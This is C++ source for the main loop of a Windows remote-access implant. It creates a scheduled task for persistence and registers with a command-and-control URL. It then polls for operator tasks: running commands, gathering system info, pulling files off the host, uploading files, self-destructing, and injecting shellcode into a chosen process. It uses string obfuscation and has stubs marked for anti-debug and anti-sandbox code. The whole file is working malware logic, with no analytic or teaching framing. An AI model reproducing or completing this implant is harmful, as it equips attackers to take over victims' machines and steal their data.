#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <stdio.h>
#include <sodium.h>
#include <string.h>
#include <vector>
#include "obfuscator/MetaString.h"
#include "rapidjson/rapidjson.h"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "crypto.h"
#include "httpclient.h"
#include "profile.h"
#include "implant.h"
#include "constants.h"
#include "debug.h"
#include "opcode.h"
#include "command.h"
#include "utils.h"
#include "handlers.h"
#include "schtask.h"

using namespace std;
using namespace andrivet::ADVobfuscator;

MalleableProfile *currentProfile;

int main()
{
	if (sodium_init() < 0)
	{
		return 1;
	}

	// Anti Debug

	// Anti Sandbox

	// Persistence
	wchar_t *pSelfImplantPath =  GetImplantPath();
	int task_status = createScheduledTask(pSelfImplantPath, SysAllocString(L"15:30:00"));

	string privKey;
	string pubKey;
	int status = createBase64KeyPair(&privKey, &pubKey);

	if (status != 0)
	{
		DEBUG_PRINTF("Error creating key pair, aborting\n");
		exit(1);
	}

	currentProfile = Register(C2_URL, pubKey, privKey);

	if (currentProfile == NULL)
	{
		DEBUG_PRINTF("Error registering, aborting\n");
		exit(1);
	}

	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());

	// do stuff with the response
	Sleep(1);


	// Checkin loop
	while (TRUE)
	{
		float sleeptime = currentProfile->sleep + (currentProfile->sleep * currentProfile->jitter);
		// Sleep(currentProfile->sleep * 1000);
		Sleep(5000);
		Task *newTask = Checkin(C2_URL, currentProfile);
		if (newTask == NULL)
		{
			continue;
		}

		DEBUG_PRINTF("Task ID: %s\n", newTask->taskId.c_str());
		int opcode = newTask->opcode;
		bool success = false;
		DEBUG_PRINTF("Opcode: %d\n", opcode);
		if (opcode == OPCODE_CMD)
		{
			HandleCmd(newTask, currentProfile);
		}
		else if (opcode == OPCODE_SELFDESTRUCT)
		{
			SelfDestruct();
		}
		else if (opcode == OPCODE_SYSINFO)
		{
			string sysInfo = SysInfo();
			success = true;
			if (!SendTaskResult(newTask->taskId.c_str(), C2_URL, sysInfo.c_str(), success, currentProfile))
			{
				DEBUG_PRINTF("Error sending output\n");
			}
		}
		else if (opcode == OPCODE_SLEEP)
		{
			int numSeconds = newTask->args->GetInt();
			if (numSeconds < 0)
			{
				DEBUG_PRINTF("Invalid sleep time\n");
				continue;
			}
			Sleep(numSeconds * 1000);
			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
		}
		else if (opcode == OPCODE_UPDATE_CONFIG) {
			rapidjson::Value* changes = newTask->args;
			UpdateProfile(changes, currentProfile);
			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
		}
		else if (opcode == OPCODE_DOWNLOAD) {
			std::string result = Download(newTask->args->GetString());
			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_UPLOAD) {
			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
			std::string fileName = arr[0].GetString();
			std::string b64content = arr[1].GetString();
			std::string result = Upload(fileName, b64content);
			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_INJECT) {
			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
			std::string shellcode = arr[0].GetString();
			std::string processName = arr[1].GetString();
			std::string result = Inject(shellcode, processName);
			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);

		}
	}
}
